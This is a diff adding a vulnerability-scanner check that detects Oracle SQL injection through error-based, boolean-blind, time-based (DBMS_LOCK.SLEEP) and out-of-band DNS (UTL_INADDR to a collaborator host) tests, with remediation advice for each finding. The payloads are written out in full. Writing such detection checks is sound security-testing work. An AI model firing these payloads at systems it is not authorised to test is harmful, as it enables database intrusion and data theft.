@@ -1,0 +1,64 @@
+# Oracle SQL Injection Detection
+# Tests error-based, boolean-based, time-based, and OOB SQLi
+
+given insertion_point: "request"
+
+# Extract baseline response
+extract original_body from response.body
+extract original_status from response.status
+extract original_time from response.time
+
+# 1. Error-Based: Trigger Oracle syntax error
+send request:
+  replace insertion_point with insertion_point + "'"
+if regex `ORA-01756|ORA-00933|missing expression` in response.body then
+  report issue:
+    severity: high
+    confidence: certain
+    name: "Oracle SQL Injection (Error-Based)"
+    detail: "Oracle error detected with payload: {insertion_point + '''}. Response: {regex `ORA-01756|ORA-00933|missing expression`}"
+    remediation: "Use bind variables or parameterized queries."
+end if
+
+# 2. Boolean-Based Blind: Check response content change
+send request:
+  replace insertion_point with insertion_point + "' AND 1=1--"
+extract true_response from response.body
+
+send request:
+  replace insertion_point with insertion_point + "' AND 1=2--"
+extract false_response from response.body
+
+if true_response != false_response and true_response == original_body then
+  report issue:
+    severity: high
+    confidence: firm
+    name: "Oracle SQL Injection (Boolean-Based Blind)"
+    detail: "Response changed between true (1=1) and false (1=2) conditions. True payload: {insertion_point + ''' AND 1=1--'}"
+    remediation: "Sanitize inputs and use parameterized queries."
+end if
+
+# 3. Time-Based Blind: Use DBMS_LOCK.SLEEP
+send request:
+  replace insertion_point with insertion_point + "' AND (SELECT DBMS_LOCK.SLEEP(5) FROM DUAL)=0--"
+  set timeout to 10 seconds
+if response.time > original_time + 5000 then
+  report issue:
+    severity: high
+    confidence: tentative
+    name: "Oracle SQL Injection (Time-Based Blind)"
+    detail: "Response delayed by {response.time - original_time}ms with payload: {insertion_point + ''' AND (SELECT DBMS_LOCK.SLEEP(5) FROM DUAL)=0--'}"
+    remediation: "Implement strict input validation and use bind variables."
+end if
+
+# 4. Out-of-Band: DNS via UTL_INADDR
+send request:
+  replace insertion_point with insertion_point + "'; BEGIN UTL_INADDR.GET_HOST_ADDRESS('test.' || collaborator_address); END;--"
+if dns interactions then
+  report issue:
+    severity: high
+    confidence: certain
+    name: "Oracle SQL Injection (Out-of-Band)"
+    detail: "DNS interaction detected via Collaborator with payload: {insertion_point + '''; BEGIN UTL_INADDR.GET_HOST_ADDRESS('test.' || collaborator_address); END;--'}"
+    remediation: "Disable unnecessary PL/SQL packages and use parameterized queries."
+end if
